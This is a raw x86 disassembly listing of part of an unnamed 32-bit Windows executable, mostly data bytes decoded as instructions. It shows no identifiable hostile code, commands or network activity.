  408c38:	a8 8c                	test   $0x8c,%al
  408c3a:	40                   	inc    %eax
  408c3b:	00 68 8c             	add    %ch,-0x74(%eax)
  408c3e:	40                   	inc    %eax
  408c3f:	00 0c 79             	add    %cl,(%ecx,%edi,2)
  408c42:	24 00                	and    $0x0,%al
  408c44:	ff                   	(bad)
  408c45:	ff                   	(bad)
  408c46:	ff                   	(bad)
  408c47:	ff                   	(bad)
  408c48:	ff                   	(bad)
  408c49:	ff                   	(bad)
  408c4a:	ff                   	(bad)
  408c4b:	ff                   	(bad)
  408c4c:	ff                   	(bad)
  408c4d:	ff                   	(bad)
  408c4e:	ff                   	(bad)
  408c4f:	ff                   	(bad)
  408c50:	ff                   	(bad)
  408c51:	ff                   	(bad)
  408c52:	ff                   	(bad)
  408c53:	ff                   	(bad)
  408c54:	ff                   	(bad)
  408c55:	ff                   	(bad)
  408c56:	ff                   	(bad)
  408c57:	ff                   	(bad)
  408c58:	ff                   	(bad)
  408c59:	ff                   	(bad)
  408c5a:	ff                   	(bad)
  408c5b:	ff                   	(bad)
  408c5c:	ff                   	(bad)
  408c5d:	ff                   	(bad)
  408c5e:	ff                   	(bad)
  408c5f:	ff                   	(bad)
  408c60:	ff                   	(bad)
  408c61:	ff                   	(bad)
  408c62:	ff                   	(bad)
  408c63:	ff                   	(bad)
  408c64:	ff                   	(bad)
  408c65:	ff                   	(bad)
  408c66:	ff                   	(bad)
  408c67:	ff 00                	incl   (%eax)
  408c69:	00 00                	add    %al,(%eax)
  408c6b:	00 d0                	add    %dl,%al
  408c6d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c6e:	40                   	inc    %eax
  408c6f:	00 ff                	add    %bh,%bh
  408c71:	ff                   	(bad)
  408c72:	ff                   	(bad)
  408c73:	ff 00                	incl   (%eax)
	...
  408c7d:	00 00                	add    %al,(%eax)
  408c7f:	00 20                	add    %ah,(%eax)
  408c81:	8c 40 00             	mov    %es,0x0(%eax)
  408c84:	00 00                	add    %al,(%eax)
  408c86:	00 00                	add    %al,(%eax)
  408c88:	20 8c 40 00 20 8c 40 	and    %cl,0x408c2000(%eax,%eax,2)
  408c8f:	00 20                	add    %ah,(%eax)
  408c91:	8c 40 00             	mov    %es,0x0(%eax)
	...
  408ca0:	40                   	inc    %eax
  408ca1:	00 00                	add    %al,(%eax)
  408ca3:	00 04 01             	add    %al,(%ecx,%eax,1)
  408ca6:	00 00                	add    %al,(%eax)
  408ca8:	00 00                	add    %al,(%eax)
  408caa:	00 00                	add    %al,(%eax)
  408cac:	70 75                	jo     0x408d23
  408cae:	40                   	inc    %eax
  408caf:	00 ff                	add    %bh,%bh
  408cb1:	ff                   	(bad)
  408cb2:	ff                   	(bad)
  408cb3:	ff 00                	incl   (%eax)
  408cb5:	00 00                	add    %al,(%eax)
  408cb7:	00 01                	add    %al,(%ecx)
  408cb9:	00 00                	add    %al,(%eax)
  408cbb:	00 00                	add    %al,(%eax)
  408cbd:	00 00                	add    %al,(%eax)
  408cbf:	00 24 8c             	add    %ah,(%esp,%ecx,4)
  408cc2:	40                   	inc    %eax
  408cc3:	00 00                	add    %al,(%eax)
  408cc5:	00 00                	add    %al,(%eax)
  408cc7:	00 20                	add    %ah,(%eax)
  408cc9:	8c 40 00             	mov    %es,0x0(%eax)
  408ccc:	20 8c 40 00 20 8c 40 	and    %cl,0x408c2000(%eax,%eax,2)
	...
  408cdf:	00 48 00             	add    %cl,0x0(%eax)
  408ce2:	00 00                	add    %al,(%eax)
  408ce4:	04 00                	add    $0x0,%al
  408ce6:	00 00                	add    %al,(%eax)
  408ce8:	00 00                	add    %al,(%eax)
  408cea:	00 00                	add    %al,(%eax)
  408cec:	2c 78                	sub    $0x78,%al
  408cee:	40                   	inc    %eax
  408cef:	00 ff                	add    %bh,%bh
  408cf1:	ff                   	(bad)
  408cf2:	ff                   	(bad)
  408cf3:	ff 00                	incl   (%eax)
  408cf5:	00 00                	add    %al,(%eax)
  408cf7:	00 38                	add    %bh,(%eax)
  408cf9:	8c 40 00             	mov    %es,0x0(%eax)
	...
  408d08:	ff                   	(bad)
  408d09:	ff                   	(bad)
  408d0a:	ff                   	(bad)
  408d0b:	ff 00                	incl   (%eax)
  408d0d:	00 00                	add    %al,(%eax)
  408d0f:	00 7c 7c 40          	add    %bh,0x40(%esp,%edi,2)
  408d13:	00 18                	add    %bl,(%eax)
  408d15:	7c 40                	jl     0x408d57
  408d17:	00 74 c8 40          	add    %dh,0x40(%eax,%ecx,8)
  408d1b:	00 00                	add    %al,(%eax)
  408d1d:	00 00                	add    %al,(%eax)
  408d1f:	00 a4 7c 40 00 78 c8 	add    %ah,-0x3787ffc0(%esp,%edi,2)
  408d26:	40                   	inc    %eax
  408d27:	00 7c 7c 40          	add    %bh,0x40(%esp,%edi,2)
  408d2b:	00 bc 7c 40 00 7c c8 	add    %bh,-0x3783ffc0(%esp,%edi,2)
  408d32:	40                   	inc    %eax
  408d33:	00 7c 7f 40          	add    %bh,0x40(%edi,%edi,2)
  408d37:	00 28                	add    %ch,(%eax)
  408d39:	7f 40                	jg     0x408d7b
  408d3b:	00 80 c8 40 00 04    	add    %al,0x40040c8(%eax)
  408d41:	64 ff 04 68          	incl   %fs:(%eax,%ebp,2)
  408d45:	ff 05 00 00 24 01    	incl   0x1240000
  408d4b:	00 0d 14 00 02 00    	add    %cl,0x20014
  408d51:	08 68 ff             	or     %ch,-0x1(%eax)
  408d54:	0d 58 00 03 00       	or     $0x30058,%eax
  408d59:	6c                   	insb   (%dx),%es:(%edi)
  408d5a:	64 ff 1b             	lcall  *%fs:(%ebx)
  408d5d:	04 00                	add    $0x0,%al
  408d5f:	2a fd                	sub    %ch,%bh
  408d61:	c7                   	(bad)
  408d62:	60                   	pusha
  408d63:	ff 0a                	decl   (%edx)
  408d65:	05 00 04 00 32       	add    $0x32000400,%eax
  408d6a:	04 00                	add    $0x0,%al
  408d6c:	64 ff 60 ff          	jmp    *%fs:-0x1(%eax)
  408d70:	1a 68 ff             	sbb    -0x1(%eax),%ch
  408d73:	fd                   	std
  408d74:	95                   	xchg   %eax,%ebp
  408d75:	10 00                	adc    %al,(%eax)
  408d77:	00 80 70 40 00 08    	add    %al,0x8004070(%eax)
  408d7d:	00 1c 00             	add    %bl,(%eax,%eax,1)
  408d80:	38 00                	cmp    %al,(%eax)
  408d82:	28 00                	sub    %al,(%eax)
  408d84:	00 00                	add    %al,(%eax)
  408d86:	00 00                	add    %al,(%eax)
  408d88:	00 00                	add    %al,(%eax)
  408d8a:	13 00                	adc    (%eax),%eax
  408d8c:	00 00                	add    %al,(%eax)
  408d8e:	00 00                	add    %al,(%eax)
  408d90:	10 00                	adc    %al,(%eax)
  408d92:	00 00                	add    %al,(%eax)
  408d94:	00 00                	add    %al,(%eax)
  408d96:	01 00                	add    %eax,(%eax)
  408d98:	00 00                	add    %al,(%eax)
  408d9a:	00 01                	add    %al,(%ecx)
  408d9c:	6c                   	insb   (%dx),%es:(%edi)
  408d9d:	ff 02                	incl   (%edx)
  408d9f:	00 18                	add    %bl,(%eax)
  408da1:	00 00                	add    %al,(%eax)
  408da3:	00 00                	add    %al,(%eax)
  408da5:	00 03                	add    %al,(%ebx)
  408da7:	00 00                	add    %al,(%eax)
  408da9:	00 00                	add    %al,(%eax)
  408dab:	00 64 ff 01          	add    %ah,0x1(%edi,%edi,8)
  408daf:	00 60 ff             	add    %ah,-0x1(%eax)
  408db2:	01 00                	add    %eax,(%eax)
  408db4:	68 ff 03 00 04       	push   $0x40003ff
  408db9:	78 ff                	js     0x408dba
  408dbb:	80 10 00             	adcb   $0x0,(%eax)
  408dbe:	04 74                	add    $0x74,%al
  408dc0:	ff 34 6c             	push   (%esp,%ebp,2)
  408dc3:	74 ff                	je     0x408dc4
  408dc5:	80 0c 00 0a          	orb    $0xa,(%eax,%eax,1)
  408dc9:	1f                   	pop    %ds
  408dca:	00 0c 00             	add    %cl,(%eax,%eax,1)
  408dcd:	3c 6c                	cmp    $0x6c,%al
  408dcf:	74 ff                	je     0x408dd0
  408dd1:	6c                   	insb   (%dx),%es:(%edi)
  408dd2:	10 00                	adc    %al,(%eax)
  408dd4:	fc                   	cld
  408dd5:	58                   	pop    %eax
  408dd6:	2f                   	das
  408dd7:	74 ff                	je     0x408dd8
  408dd9:	80 14 00 04          	adcb   $0x4,(%eax,%eax,1)
  408ddd:	74 ff                	je     0x408dde
  408ddf:	34 6c                	xor    $0x6c,%al
  408de1:	74 ff                	je     0x408de2
  408de3:	6c                   	insb   (%dx),%es:(%edi)
  408de4:	78 ff                	js     0x408de5
  408de6:	0a 15 00 08 00 3c    	or     0x3c000800,%dl
  408dec:	6c                   	insb   (%dx),%es:(%edi)
  408ded:	74 ff                	je     0x408dee
  408def:	6c                   	insb   (%dx),%es:(%edi)
  408df0:	14 00                	adc    $0x0,%al
  408df2:	fc                   	cld
  408df3:	58                   	pop    %eax
  408df4:	2f                   	das
  408df5:	74 ff                	je     0x408df6
  408df7:	6c                   	insb   (%dx),%es:(%edi)
  408df8:	78 ff                	js     0x408df9
  408dfa:	0a 03                	or     (%ebx),%al
  408dfc:	00 04 00             	add    %al,(%eax,%eax,1)
  408dff:	3c 14                	cmp    $0x14,%al
  408e01:	00 00                	add    %al,(%eax)
  408e03:	00 8c 71 40 00 10 00 	add    %cl,0x100040(%ecx,%esi,2)
  408e0a:	08 00                	or     %al,(%eax)
  408e0c:	4c                   	dec    %esp
  408e0d:	00 24 00             	add    %ah,(%eax,%eax,1)
  408e10:	00 00                	add    %al,(%eax)
  408e12:	00 00                	add    %al,(%eax)
  408e14:	00 00                	add    %al,(%eax)
  408e16:	13 00                	adc    (%eax),%eax
  408e18:	00 00                	add    %al,(%eax)
  408e1a:	00 00                	add    %al,(%eax)
  408e1c:	0c 00                	or     $0x0,%al
	...
  408e26:	00 00                	add    %al,(%eax)
  408e28:	10 00                	adc    %al,(%eax)
  408e2a:	00 00                	add    %al,(%eax)
  408e2c:	00 00                	add    %al,(%eax)
  408e2e:	01 00                	add    %eax,(%eax)
  408e30:	00 00                	add    %al,(%eax)
  408e32:	00 00                	add    %al,(%eax)
  408e34:	74 ff                	je     0x408e35
  408e36:	01 00                	add    %eax,(%eax)
  408e38:	00 02                	add    %al,(%edx)
  408e3a:	00 0e                	add    %cl,(%esi)
  408e3c:	0b 00                	or     (%eax),%eax
  408e3e:	00 00                	add    %al,(%eax)
  408e40:	00 46 5c             	add    %al,0x5c(%esi)
  408e43:	ff                   	(bad)
  408e44:	fc                   	cld
  408e45:	f6 6c ff 00          	imulb  0x0(%edi,%edi,8)
  408e49:	05 4b ff ff 00       	add    $0xffff4b,%eax
  408e4e:	17                   	pop    %ss
  408e4f:	04 6c                	add    $0x6c,%al
  408e51:	ff 80 0c 00 46 4c    	incl   0x4c46000c(%eax)
  408e57:	ff                   	(bad)
  408e58:	fb                   	sti
  408e59:	94                   	xchg   %eax,%esp
  408e5a:	5c                   	pop    %esp
  408e5b:	ff 0a                	decl   (%edx)
  408e5d:	01 00                	add    %eax,(%eax)
  408e5f:	04 00                	add    $0x0,%al
  408e61:	35 5c ff 00 07       	xor    $0x700ff5c,%eax
  408e66:	0a 02                	or     (%edx),%al
  408e68:	00 00                	add    %al,(%eax)
  408e6a:	00 00                	add    %al,(%eax)
  408e6c:	17                   	pop    %ss
  408e6d:	04 6c                	add    $0x6c,%al
  408e6f:	ff 80 10 00 46 4c    	incl   0x4c460010(%eax)
  408e75:	ff                   	(bad)
  408e76:	fb                   	sti
  408e77:	94                   	xchg   %eax,%esp
  408e78:	5c                   	pop    %esp
  408e79:	ff 0a                	decl   (%edx)
  408e7b:	01 00                	add    %eax,(%eax)
  408e7d:	04 00                	add    $0x0,%al
  408e7f:	35 5c ff 00 07       	xor    $0x700ff5c,%eax
  408e84:	0a 02                	or     (%edx),%al
  408e86:	00 00                	add    %al,(%eax)
  408e88:	00 00                	add    %al,(%eax)
  408e8a:	00 14 94             	add    %dl,(%esp,%edx,4)
  408e8d:	6c                   	insb   (%dx),%es:(%edi)
  408e8e:	40                   	inc    %eax
  408e8f:	00 0c 00             	add    %cl,(%eax,%eax,1)
  408e92:	30 00                	xor    %al,(%eax)
  408e94:	54                   	push   %esp
  408e95:	00 28                	add    %ch,(%eax)
  408e97:	00 00                	add    %al,(%eax)
  408e99:	00 00                	add    %al,(%eax)
  408e9b:	00 00                	add    %al,(%eax)
  408e9d:	00 13                	add    %dl,(%ebx)
  408e9f:	00 00                	add    %al,(%eax)
  408ea1:	00 00                	add    %al,(%eax)
  408ea3:	00 10                	add    %dl,(%eax)
  408ea5:	00 00                	add    %al,(%eax)
  408ea7:	00 00                	add    %al,(%eax)
  408ea9:	00 01                	add    %al,(%ecx)
  408eab:	00 00                	add    %al,(%eax)
  408ead:	00 00                	add    %al,(%eax)
  408eaf:	00 6c ff 02          	add    %ch,0x2(%edi,%edi,8)
  408eb3:	00 10                	add    %dl,(%eax)
  408eb5:	00 00                	add    %al,(%eax)
  408eb7:	00 00                	add    %al,(%eax)
  408eb9:	00 01                	add    %al,(%ecx)
  408ebb:	00 00                	add    %al,(%eax)
  408ebd:	00 00                	add    %al,(%eax)
  408ebf:	00 5c ff 02          	add    %bl,0x2(%edi,%edi,8)
  408ec3:	00 00                	add    %al,(%eax)
  408ec5:	02 00                	add    (%eax),%al
  408ec7:	05 4b ff ff 00       	add    $0xffff4b,%eax
  408ecc:	35 80 10 00 1b       	xor    $0x1b001080,%eax
  408ed1:	13 00                	adc    (%eax),%eax
  408ed3:	2a 23                	sub    (%ebx),%ah
  408ed5:	70 ff                	jo     0x408ed6
  408ed7:	80 14 00 2a          	adcb   $0x2a,(%eax,%eax,1)
  408edb:	23 6c ff 04          	and    0x4(%edi,%edi,8),%ebp
  408edf:	68 ff 34 6c 68       	push   $0x686c34ff
  408ee4:	ff 80 0c 00 5e 14    	incl   0x145e000c(%eax)
  408eea:	00 08                	add    %cl,(%eax)
  408eec:	00 71 64             	add    %dh,0x64(%ecx)
  408eef:	ff                   	(bad)
  408ef0:	3c 6c                	cmp    $0x6c,%al
  408ef2:	64 ff 71 74          	push   %fs:0x74(%ecx)
  408ef6:	ff 32                	push   (%edx)
  408ef8:	06                   	push   %es
  408ef9:	00 70 ff             	add    %dh,-0x1(%eax)
  408efc:	6c                   	insb   (%dx),%es:(%edi)
  408efd:	ff 68 ff             	ljmp   *-0x1(%eax)
  408f00:	00 0e                	add    %cl,(%esi)
  408f02:	6c                   	insb   (%dx),%es:(%edi)
  408f03:	74 ff                	je     0x408f04
  408f05:	f5                   	cmc
  408f06:	00 00                	add    %al,(%eax)
  408f08:	00 00                	add    %al,(%eax)
  408f0a:	c7                   	(bad)
  408f0b:	1c 54                	sbb    $0x54,%al
  408f0d:	00 00                	add    %al,(%eax)
  408f0f:	07                   	pop    %es
  408f10:	f4                   	hlt
  408f11:	ff 70 7a             	push   0x7a(%eax)
  408f14:	ff 1e                	lcall  *(%esi)
  408f16:	5d                   	pop    %ebp
  408f17:	00 00                	add    %al,(%eax)
  408f19:	02 00                	add    (%eax),%al
  408f1b:	07                   	pop    %es
  408f1c:	f4                   	hlt
  408f1d:	00 70 7a             	add    %dh,0x7a(%eax)
  408f20:	ff 00                	incl   (%eax)
  408f22:	02 00                	add    (%eax),%al
  408f24:	00 15 ff ff 8c 71    	add    %dl,0x718cffff
  408f2a:	40                   	inc    %eax
  408f2b:	00 10                	add    %dl,(%eax)
  408f2d:	00 18                	add    %bl,(%eax)
  408f2f:	00 64 00 24          	add    %ah,0x24(%eax,%eax,1)
  408f33:	00 00                	add    %al,(%eax)
  408f35:	00 00                	add    %al,(%eax)
  408f37:	00 00                	add    %al,(%eax)
  408f39:	00 13                	add    %dl,(%ebx)
  408f3b:	00 00                	add    %al,(%eax)
  408f3d:	00 00                	add    %al,(%eax)
  408f3f:	00 0c 00             	add    %cl,(%eax,%eax,1)
	...
  408f4a:	00 00                	add    %al,(%eax)
  408f4c:	18 00                	sbb    %al,(%eax)
  408f4e:	00 00                	add    %al,(%eax)
  408f50:	00 00                	add    %al,(%eax)
  408f52:	03 00                	add    (%eax),%eax
  408f54:	00 00                	add    %al,(%eax)
  408f56:	00 00                	add    %al,(%eax)
  408f58:	70 ff                	jo     0x408f59
  408f5a:	01 00                	add    %eax,(%eax)
  408f5c:	6c                   	insb   (%dx),%es:(%edi)
  408f5d:	ff 01                	incl   (%ecx)
  408f5f:	00 68 ff             	add    %ch,-0x1(%eax)
  408f62:	01 00                	add    %eax,(%eax)
  408f64:	04 70                	add    $0x70,%al
  408f66:	ff 04 74             	incl   (%esp,%esi,2)
  408f69:	ff 05 00 00 24 01    	incl   0x1240000
  408f6f:	00 0d 14 00 02 00    	add    %cl,0x20014
  408f75:	08 74 ff 0d          	or     %dh,0xd(%edi,%edi,8)
  408f79:	50                   	push   %eax
  408f7a:	00 03                	add    %al,(%ebx)
  408f7c:	00 6c 70 ff          	add    %ch,-0x1(%eax,%esi,2)
  408f80:	1b 04 00             	sbb    (%eax,%eax,1),%eax
  408f83:	2a 31                	sub    (%ecx),%dh
  408f85:	78 ff                	js     0x408f86
  408f87:	2f                   	das
  408f88:	70 ff                	jo     0x408f89
  408f8a:	1a 74 ff 04          	sbb    0x4(%edi,%edi,8),%dh
  408f8e:	70 ff                	jo     0x408f8f
  408f90:	04 74                	add    $0x74,%al
  408f92:	ff 05 00 00 24 01    	incl   0x1240000
  408f98:	00 0d 14 00 02 00    	add    %cl,0x20014
  408f9e:	08 74 ff 0d          	or     %dh,0xd(%edi,%edi,8)
  408fa2:	50                   	push   %eax
  408fa3:	00 03                	add    %al,(%ebx)
  408fa5:	00 6c 70 ff          	add    %ch,-0x1(%eax,%esi,2)
  408fa9:	4a                   	dec    %edx
  408faa:	f5                   	cmc
  408fab:	03 00                	add    (%eax),%eax
  408fad:	00 00                	add    %al,(%eax)
  408faf:	c7                   	(bad)
  408fb0:	2f                   	das
  408fb1:	70 ff                	jo     0x408fb2
  408fb3:	1a 74 ff 1c          	sbb    0x1c(%edi,%edi,8),%dh
  408fb7:	77 00                	ja     0x408fb9
  408fb9:	04 70                	add    $0x70,%al
  408fbb:	ff 04 74             	incl   (%esp,%esi,2)
  408fbe:	ff 05 00 00 24 01    	incl   0x1240000
  408fc4:	00 0d 14 00 02 00    	add    %cl,0x20014
  408fca:	08 74 ff 0d          	or     %dh,0xd(%edi,%edi,8)
  408fce:	50                   	push   %eax
  408fcf:	00 03                	add    %al,(%ebx)
  408fd1:	00 3e                	add    %bh,(%esi)
  408fd3:	70 ff                	jo     0x408fd4
  408fd5:	31 78 ff             	xor    %edi,-0x1(%eax)
  408fd8:	1a 74 ff 14          	sbb    0x14(%edi,%edi,8),%dh
  408fdc:	08 6d 40             	or     %ch,0x40(%ebp)
  408fdf:	00 04 00             	add    %al,(%eax,%eax,1)
  408fe2:	0c 00                	or     $0x0,%al
  408fe4:	78 00                	js     0x408fe6
  408fe6:	28 00                	sub    %al,(%eax)
  408fe8:	00 00                	add    %al,(%eax)
  408fea:	00 00                	add    %al,(%eax)
  408fec:	00 00                	add    %al,(%eax)
  408fee:	13 00                	adc    (%eax),%eax
  408ff0:	00 00                	add    %al,(%eax)
  408ff2:	00 00                	add    %al,(%eax)
  408ff4:	10 00                	adc    %al,(%eax)
  408ff6:	00 00                	add    %al,(%eax)
  408ff8:	00 00                	add    %al,(%eax)
  408ffa:	01 00                	add    %eax,(%eax)
  408ffc:	00 00                	add    %al,(%eax)
  408ffe:	00 01                	add    %al,(%ecx)
  409000:	78 ff                	js     0x409001
  409002:	01 00                	add    %eax,(%eax)
  409004:	14 00                	adc    $0x0,%al
  409006:	00 00                	add    %al,(%eax)
  409008:	00 00                	add    %al,(%eax)
  40900a:	02 00                	add    (%eax),%al
  40900c:	00 00                	add    %al,(%eax)
  40900e:	00 00                	add    %al,(%eax)
  409010:	70 ff                	jo     0x409011
  409012:	01 00                	add    %eax,(%eax)
  409014:	74 ff                	je     0x409015
  409016:	03 00                	add    (%eax),%eax
  409018:	0b 19                	or     (%ecx),%ebx
  40901a:	00 00                	add    %al,(%eax)
  40901c:	00 23                	add    %ah,(%ebx)
  40901e:	78 ff                	js     0x40901f
  409020:	1b 07                	sbb    (%edi),%eax
  409022:	00 fb                	add    %bh,%bl
  409024:	30 2f                	xor    %ch,(%edi)
  409026:	78 ff                	js     0x409027
  409028:	1c 14                	sbb    $0x14,%al
  40902a:	00 13                	add    %dl,(%ebx)
  40902c:	0b 09                	or     (%ecx),%ecx
  40902e:	00 00                	add    %al,(%eax)
  409030:	00 31                	add    %dh,(%ecx)
  409032:	50                   	push   %eax
  409033:	ff 04 78             	incl   (%eax,%edi,2)
  409036:	ff 04 74             	incl   (%esp,%esi,2)
  409039:	ff 05 00 00 24 01    	incl   0x1240000
  40903f:	00 0d 14 00 02 00    	add    %cl,0x20014
  409045:	08 74 ff 0d          	or     %dh,0xd(%edi,%edi,8)
  409049:	58                   	pop    %eax
  40904a:	00 03                	add    %al,(%ebx)
  40904c:	00 0b                	add    %cl,(%ebx)
  40904e:	19 00                	sbb    %eax,(%eax)
  409050:	00 00                	add    %al,(%eax)
  409052:	fd                   	std
  409053:	c7                   	(bad)
  409054:	64 ff                	fs (bad)
  409056:	3e 50                	ds push %eax
  409058:	ff 23                	jmp    *(%ebx)
  40905a:	70 ff                	jo     0x40905b
  40905c:	6c                   	insb   (%dx),%es:(%edi)
  40905d:	78 ff                	js     0x40905e
  40905f:	2a 23                	sub    (%ebx),%ah
  409061:	6c                   	insb   (%dx),%es:(%edi)
  409062:	ff 1b                	lcall  *(%ebx)
  409064:	0a 00                	or     (%eax),%al
  409066:	2a fd                	sub    %ch,%bh
  409068:	c7                   	(bad)
  409069:	68 ff 04 54 ff       	push   $0xff5404ff
  40906e:	0a 0b                	or     (%ebx),%cl
  409070:	00 0c 00             	add    %cl,(%eax,%eax,1)
  409073:	32 0c 00             	xor    (%eax,%eax,1),%cl
  409076:	70 ff                	jo     0x409077
  409078:	78 ff                	js     0x409079
  40907a:	6c                   	insb   (%dx),%es:(%edi)
  40907b:	ff 68 ff             	ljmp   *-0x1(%eax)
  40907e:	64 ff 50 ff          	call   *%fs:-0x1(%eax)
  409082:	1a 74 ff 35          	sbb    0x35(%edi,%edi,8),%dh
  409086:	54                   	push   %esp
  409087:	ff 13                	call   *(%ebx)
  409089:	00 00                	add    %al,(%eax)
  40908b:	00 70 75             	add    %dh,0x75(%eax)
  40908e:	40                   	inc    %eax
  40908f:	00 08                	add    %cl,(%eax)
  409091:	00 2c 00             	add    %ch,(%eax,%eax,1)
  409094:	74 00                	je     0x409096
  409096:	24 00                	and    $0x0,%al
  409098:	00 00                	add    %al,(%eax)
  40909a:	00 00                	add    %al,(%eax)
  40909c:	00 00                	add    %al,(%eax)
  40909e:	13 00                	adc    (%eax),%eax
  4090a0:	00 00                	add    %al,(%eax)
  4090a2:	00 00                	add    %al,(%eax)
  4090a4:	0c 00                	or     $0x0,%al
	...
  4090ae:	00 00                	add    %al,(%eax)
  4090b0:	2c 00                	sub    $0x0,%al
  4090b2:	00 00                	add    %al,(%eax)
  4090b4:	00 00                	add    %al,(%eax)
  4090b6:	08 00                	or     %al,(%eax)
  4090b8:	00 00                	add    %al,(%eax)
  4090ba:	00 00                	add    %al,(%eax)
  4090bc:	78 ff                	js     0x4090bd
  4090be:	01 00                	add    %eax,(%eax)
  4090c0:	70 ff                	jo     0x4090c1
  4090c2:	01 00                	add    %eax,(%eax)
  4090c4:	6c                   	insb   (%dx),%es:(%edi)
  4090c5:	ff 01                	incl   (%ecx)
  4090c7:	00 68 ff             	add    %ch,-0x1(%eax)
  4090ca:	01 00                	add    %eax,(%eax)
  4090cc:	64 ff 01             	incl   %fs:(%ecx)
  4090cf:	00 50 ff             	add    %dl,-0x1(%eax)
  4090d2:	01 00                	add    %eax,(%eax)
  4090d4:	74 ff                	je     0x4090d5
  4090d6:	03 00                	add    (%eax),%eax
  4090d8:	54                   	push   %esp
  4090d9:	ff 02                	incl   (%edx)
  4090db:	00 00                	add    %al,(%eax)
  4090dd:	02 00                	add    (%eax),%al
  4090df:	05 4b ff ff 00       	add    $0xffff4b,%eax
  4090e4:	36 04 74             	ss add $0x74,%al
  4090e7:	ff f5                	push   %ebp
  4090e9:	19 00                	sbb    %eax,(%eax)
  4090eb:	02 00                	add    (%eax),%al
  4090ed:	f5                   	cmc
  4090ee:	00 00                	add    %al,(%eax)
  4090f0:	00 00                	add    %al,(%eax)
  4090f2:	80 10 00             	adcb   $0x0,(%eax)
  4090f5:	04 6c                	add    $0x6c,%al
  4090f7:	ff 34 6c             	push   (%esp,%ebp,2)
  4090fa:	6c                   	insb   (%dx),%es:(%edi)
  4090fb:	ff 80 0c 00 5e 02    	incl   0x25e000c(%eax)
  409101:	00 14 00             	add    %dl,(%eax,%eax,1)
  409104:	71 68                	jno    0x40916e
  409106:	ff                   	(bad)
  409107:	3c 6c                	cmp    $0x6c,%al
  409109:	6c                   	insb   (%dx),%es:(%edi)
  40910a:	ff 6c 10 00          	ljmp   *0x0(%eax,%edx,1)
  40910e:	fc                   	cld
  40910f:	58                   	pop    %eax
  409110:	6c                   	insb   (%dx),%es:(%edi)
  409111:	68 ff 71 70 ff       	push   $0xff7071ff
  409116:	2f                   	das
  409117:	6c                   	insb   (%dx),%es:(%edi)
  409118:	ff 00                	incl   (%eax)
  40911a:	0e                   	push   %cs
  40911b:	6c                   	insb   (%dx),%es:(%edi)
  40911c:	70 ff                	jo     0x40911d
  40911e:	f5                   	cmc
  40911f:	00 00                	add    %al,(%eax)
  409121:	00 00                	add    %al,(%eax)
  409123:	cc                   	int3
  409124:	1c 6a                	sbb    $0x6a,%al
  409126:	00 00                	add    %al,(%eax)
  409128:	08 80 18 00 43 78    	or     %al,0x78430018(%eax)
  40912e:	ff 00                	incl   (%eax)
  409130:	14 6c                	adc    $0x6c,%al
  409132:	74 ff                	je     0x409133
  409134:	5e                   	pop    %esi
  409135:	03 00                	add    (%eax),%eax
  409137:	04 00                	add    $0x0,%al
  409139:	71 68                	jno    0x4091a3
  40913b:	ff                   	(bad)
  40913c:	3c 6c                	cmp    $0x6c,%al
  40913e:	68 ff 71 70 ff       	push   $0xff7071ff
  409143:	00 03                	add    %al,(%ebx)
  409145:	14 00                	adc    $0x0,%al
  409147:	02 00                	add    (%eax),%al
  409149:	10 80 14 00 6c 74    	adc    %al,0x746c0014(%eax)
  40914f:	ff 0b                	decl   (%ebx)
  409151:	0a 00                	or     (%eax),%al
  409153:	08 00                	or     %al,(%eax)
  409155:	31 78 ff             	xor    %edi,-0x1(%eax)
  409158:	00 14 6c             	add    %dl,(%esp,%ebp,2)
  40915b:	74 ff                	je     0x40915c
  40915d:	5e                   	pop    %esi
  40915e:	03 00                	add    (%eax),%eax
  409160:	04 00                	add    $0x0,%al
  409162:	71 68                	jno    0x4091cc
  409164:	ff                   	(bad)
  409165:	3c 6c                	cmp    $0x6c,%al
  409167:	68 ff 71 70 ff       	push   $0xff7071ff
  40916c:	00 00                	add    %al,(%eax)
  40916e:	14 00                	adc    $0x0,%al
  409170:	8c 71 40             	mov    %?,0x40(%ecx)
  409173:	00 14 00             	add    %dl,(%eax,%eax,1)
  409176:	14 00                	adc    $0x0,%al
  409178:	94                   	xchg   %eax,%esp
  409179:	00 28                	add    %ch,(%eax)
	...
  409187:	00 10                	add    %dl,(%eax)
  409189:	00 00                	add    %al,(%eax)
  40918b:	00 00                	add    %al,(%eax)
  40918d:	00 01                	add    %al,(%ecx)
  40918f:	00 00                	add    %al,(%eax)
  409191:	00 00                	add    %al,(%eax)
  409193:	01 78 ff             	add    %edi,-0x1(%eax)
  409196:	01 00                	add    %eax,(%eax)
  409198:	10 00                	adc    %al,(%eax)
  40919a:	00 00                	add    %al,(%eax)
  40919c:	00 00                	add    %al,(%eax)
  40919e:	01 00                	add    %eax,(%eax)
  4091a0:	00 00                	add    %al,(%eax)
  4091a2:	00 00                	add    %al,(%eax)
  4091a4:	6c                   	insb   (%dx),%es:(%edi)
  4091a5:	ff 01                	incl   (%ecx)
  4091a7:	00 04 5c             	add    %al,(%esp,%ebx,2)
  4091aa:	ff 0a                	decl   (%edx)
  4091ac:	00 00                	add    %al,(%eax)
  4091ae:	04 00                	add    $0x0,%al
  4091b0:	04 5c                	add    $0x5c,%al
  4091b2:	ff 04 4c             	incl   (%esp,%ecx,2)
  4091b5:	ff 0a                	decl   (%edx)
  4091b7:	01 00                	add    %eax,(%eax)
  4091b9:	08 00                	or     %al,(%eax)
  4091bb:	04 4c                	add    $0x4c,%al
  4091bd:	ff 28                	ljmp   *(%eax)
  4091bf:	3c ff                	cmp    $0xff,%al
  4091c1:	19 00                	sbb    %eax,(%eax)
  4091c3:	5d                   	pop    %ebp
  4091c4:	fb                   	sti
  4091c5:	2f                   	das
  4091c6:	2c ff                	sub    $0xff,%al
  4091c8:	04 1c                	add    $0x1c,%al
  4091ca:	ff 0a                	decl   (%edx)
  4091cc:	00 00                	add    %al,(%eax)
  4091ce:	04 00                	add    $0x0,%al
  4091d0:	04 1c                	add    $0x1c,%al
  4091d2:	ff 04 0c             	incl   (%esp,%ecx,1)
  4091d5:	ff 0a                	decl   (%edx)
  4091d7:	02 00                	add    (%eax),%al
  4091d9:	08 00                	or     %al,(%eax)
  4091db:	04 0c                	add    $0xc,%al
  4091dd:	ff 28                	ljmp   *(%eax)
  4091df:	fc                   	cld
  4091e0:	fe 0c 00             	decb   (%eax,%eax,1)
  4091e3:	5d                   	pop    %ebp
  4091e4:	fb                   	sti
  4091e5:	2f                   	das
  4091e6:	ec                   	in     (%dx),%al
  4091e7:	fe                   	(bad)
  4091e8:	fb                   	sti
  4091e9:	27                   	daa
